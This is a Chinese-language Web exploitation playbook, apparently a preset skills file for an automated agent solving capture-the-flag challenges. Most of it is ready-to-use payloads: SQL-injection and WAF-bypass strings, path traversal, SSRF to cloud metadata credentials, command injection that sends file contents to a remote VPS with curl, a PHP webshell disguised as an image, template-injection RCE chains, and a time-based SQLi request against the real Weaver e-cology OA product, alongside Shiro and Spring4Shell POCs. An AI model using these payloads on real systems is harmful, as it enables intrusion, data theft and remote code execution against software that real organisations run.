# Web 漏洞挖掘解题手册（HuntForge 预置打法）

适用题型（命中即召回本手册）：资产管理 资产 系统 协同办公 文档 图片资源 报表
数据管理 优惠券 商城 门户网站 官网 登录 注册 上传 下载 合同 审批 流程 OA
Web 网站 网页 服务 接口 API 平台 应用 账号 用户 权限 越权 文件 目录 配置
信息泄露 未授权 注入 漏洞 安全 加密 防护 WAF。

按题型快速定位攻击路径。每题按「特征识别 → 直达载荷 → script 批量验证」三步走，
优先用 script 一次完成多步探测（stdout 回传），不要逐请求往返。

## 0. 开局侦察（每道 Web 题必做，一次 script 批量完成）
- 首页/README/robots.txt/错误页/JS 文件里的路径、bucket 名、接口名 = 免费情报，全部跟进。
- 一波拉：/robots.txt /actuator /actuator/env /actuator/health /nacos/ /nacos/v1/auth/users
  /swagger-ui.html /swagger/index.html /v2/api-docs /v3/api-docs /api-docs /openapi.json
  /.git/config /.svn/entries /.DS_Store /backup.zip /www.zip /backup.tar.gz /config.php.bak
  /web.xml /WEB-INF/web.xml /debug /console /admin /api/v1/all
- 记录每个 200/302 与响应体特征；多 flag 题每个子系统通常对应一个 flag。

## 1. 未授权访问 / 信息泄露
- actuator/env 泄露配置与密钥；nacos 默认账密 nacos/nacos、users 接口列用户；
  swagger/api-docs 列出全部接口后逐个试；.git 泄露用 git-dumper 思路读 objects。
- 云类线索（S3 bucket、Lambda、EC2）：列桶 /<bucket>?list-type=2&prefix=、
  读对象 /<bucket>/<key>，元数据 169.254.169.254 取凭证。

## 2. 登录绕过 / SQL 注入
- 试 payload 序列：admin'-- admin'# admin' OR '1'='1'-- ' OR 1=1 LIMIT 1 -- '=' '||''
- WAF 拦截时变体：Unicode 全角（' → ＇）、大小写混排、/**/ 注释、%0b 空格、
  || 替代 OR、分块传输(chunked)、Content-Encoding: gzip 压缩 body 绕过内容检测。
- 确认注入后：order by 定列数 → union select 提库（information_schema）；
  无回显用 sleep 时间盲注或报错注入 CONVERT(int,(SELECT ... FOR XML PATH('')))。

## 3. LFI / 路径穿越
- 参数塞 ../ 序列：?file=../../../../etc/passwd、/flag、/proc/self/environ；
  php://filter/convert.base64-encode/resource=index.php 读源码找下一步；
  /proc/self/fd 枚举打开文件；日志包含（User-Agent 写马）→ 包含日志 getshell。

## 4. SSRF / 内网
- file:///flag、file:///etc/passwd 直读；http://169.254.169.254/latest/meta-data 云凭证；
  http://127.0.0.1:端口 扫内网服务；gopher:// 打 redis/mysql。
- 黑名单绕过按失败类型分诊：BLOCKED=字符串黑名单（%xx 编码主机名、大小写、
  尾点、整数/八进制 IP、@ 混淆、重定向链）；DNS 失败=换名字；连接拒绝=IP 层
  拦截换表示法。详见 skills/ssrf-bypass-and-internal-pivot.md。
- 进内网先打 /debug/config、/status 类配置接口拿 token，再带 token 枚举管理端点。

## 5. 命令注入 / RCE
- 参数拼接探测：|id ;id &id $(id) `id`、换行 %0a 注入；过滤空格用 ${IFS}/$@/制表符。
- 无回显：curl http://<vps>/$(cat /flag) 外带或 sleep 盲判。
- 导出/生成器类功能：响应回显命令模板时逐字段分析转义，被转义的字段换
  未转义字段（文件名/路径字段零过滤是常态）注入，结果写 Web 可达目录再取回。
  详见 skills/command-injection-generators.md。
- 模板注入：{{7*7}} ${7*7} <%= 7*7 %> 判引擎 → 走对应引擎通用 RCE 链
  （Jinja2 用 cycler.__init__.__globals__.os.popen 一族）。
  详见 skills/ssti-template-injection.md。

## 6. 文件上传
- 图片马：GIF89a/PNG 头 + <?php system($_GET['c']);?>；双扩展 .php.jpg、.php%00、.phtml/.pht；
  Content-Type 伪造 image/png；上传后爆破落地路径（/uploads/、/upload/、/files/）。
- 解析漏洞：Nginx 路径解析 /x.jpg/x.php、Apache .htaccess 覆盖。

## 7. 反序列化
- pickle：__reduce__ RCE（项目内置 gen_pickle）；Java：ysoserial（内置 shiro POC）；
  node-serialize：_$$ND_FUNC$$（内置 gen_deser）；fastjson JNDI。

## 8. 越权 / IDOR
- 改 id/uuid/order_id 参数枚举相邻值；改 X-Forwarded-For/X-Real-IP 伪装内网；
  低权账号换高权接口重放（水平/垂直越权）。
- 批量赋值：编辑/更新接口常接受任意字段（增量语义），覆写文件路径/角色/
  价格等系统字段后配合下载接口读任意文件；JS 注释常点名系统字段名。
  详见 skills/idor-mass-assignment.md。

## 9. 国产组件（指纹直达）
- 泛微 e-cology（/weaver/ /wui/）：FileDownloadForOutDoc SQLi
  POST /weaver/weaver.file.FileDownloadForOutDoc body=fileid=1+WAITFOR+DELAY+'0:0:4'&isFromOutImg=1
  延迟即中；报错注入拉表（内置 weaver_sqli POC）。
- 致远（/seeyon/）：htmlofficeservlet 等内置 POC。
- Shiro：rememberMe=deleteMe 特征 → 内置 shiro_exploit POC。
- SpringBoot：/actuator 全家桶 + Spring4Shell（内置 POC）。

## 10. 多 flag 题
- 每 flag 不同子系统：先解最容易的（未授权/默认口令），提交后立即换攻击面继续，
  不要停。高分综合题常 = 企业门户 + OA + 云组件混合，按子系统逐个拆。
